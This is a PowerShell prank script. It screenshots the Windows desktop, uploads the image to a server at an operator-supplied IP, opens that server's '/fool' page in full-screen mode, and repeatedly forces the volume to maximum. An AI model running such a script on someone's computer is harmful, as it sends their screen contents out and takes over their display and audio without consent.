# Import the required assembly
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$defaultIpAdress = "localhost"  # Host ip adress


# ---------------------------------------------------------------------------- #
#                                  USER INPUTS                                 #
# ---------------------------------------------------------------------------- #

# Prompt the user for an IP address
$ipAddress = Read-Host "Enter IP address (default is localhost)"
if ([string]::IsNullOrWhiteSpace($ipAddress)) {
    $ipAddress = $defaultIpAdress
}
# Prompt the user for the server port
$volumeLoop = Read-Host "Do you want to loop? (Y/N)"

# Construct the URLs
$appUrl = "http://${ipAddress}/fool"
$apiUrl = "http://${ipAddress}/api/desktop/set"

# ---------------------------------------------------------------------------- #
#                              DESKTOP SCREENSHOT                              #
# ---------------------------------------------------------------------------- #

Write-Output "[*] Take a screenshot of user desktop"

# Back to desktop
(New-Object -ComObject Shell.Application).ToggleDesktop()
Start-Sleep -Seconds 1

# Create a bitmap of the user's desktop
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)

# Convert bitmap to base64 string
$imageStream = New-Object System.IO.MemoryStream
$bitmap.Save($imageStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
$imageBytes = $imageStream.ToArray()
$imageBase64 = [System.Convert]::ToBase64String($imageBytes)

# Free resources
$graphics.Dispose()
$bitmap.Dispose()


# ---------------------------------------------------------------------------- #
#                              POST THE SCREENSHOT                             #
# ---------------------------------------------------------------------------- #

Write-Output "[*] Post the screenshot"

# Post the file to the specified route
$body = @{ image = $imageBase64 } | ConvertTo-Json
$response = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $body -ContentType "application/json"

# Check if the post was successful
if ($response.message -eq "Image uploaded successfully") {
   Write-Output " - Screenshot successfully uploaded"
}
else {
   Write-Output "[!] Error uploading screenshot: $($response.message)"
   Start-Sleep -Seconds 4
   exit
}


# ---------------------------------------------------------------------------- #
#                          OPEN APP IN DEFAULT BROWSER                         #
# ---------------------------------------------------------------------------- #

Write-Output "[*] Open application in default browser"

# Open the URL in the default web browser
Start-Process $appUrl

# Wait for the page to load
Start-Sleep -Seconds 3

# Send the F11 key to enter full-screen mode
[System.Windows.Forms.SendKeys]::SendWait("{F11}")


# ---------------------------------------------------------------------------- #
#                             AUDIO VOLUME CONTROL                             #
# ---------------------------------------------------------------------------- #

Write-Output "[*] Turn the volume up"

# Function from https://stackoverflow.com/questions/21355891/change-audio-level-from-powershell
Add-Type -TypeDefinition @'
   using System.Runtime.InteropServices;
   [Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
   interface IAudioEndpointVolume
   {
       // f(), g(), ... are unused COM method slots. Define these if you care
       int f(); int g(); int h(); int i();
       int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
       int j();
       int GetMasterVolumeLevelScalar(out float pfLevel);
       int k(); int l(); int m(); int n();
       int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);
       int GetMute(out bool pbMute);
   }
   [Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
   interface IMMDevice
   {
       int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);
   }
   [Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
   interface IMMDeviceEnumerator
   {
       int f(); // Unused
       int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);
   }
   [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
   public class Audio
   {
       static IAudioEndpointVolume Vol()
       {
           var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
           IMMDevice dev = null;
           Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev));
           IAudioEndpointVolume epv = null;
           var epvid = typeof(IAudioEndpointVolume).GUID;
           Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv));
           return epv;
       }
       public static float Volume
       {
           get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }
           set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }
       }
       public static bool Mute
       {
           get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; }
           set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }
       }
}
'@

do {
    # Disable mute
    [audio]::Mute = $false
    # Sets volume to 100%
    [audio]::Volume = 1
    Start-Sleep -Seconds 5
} while($volumeLoop -eq "Y")

# ---------------------------------------------------------------------------- #

Write-Output "[*] OK! Leaving..."

# Wait before leaving the script
# (must be disabled in production)
# Start-Sleep -Seconds 60
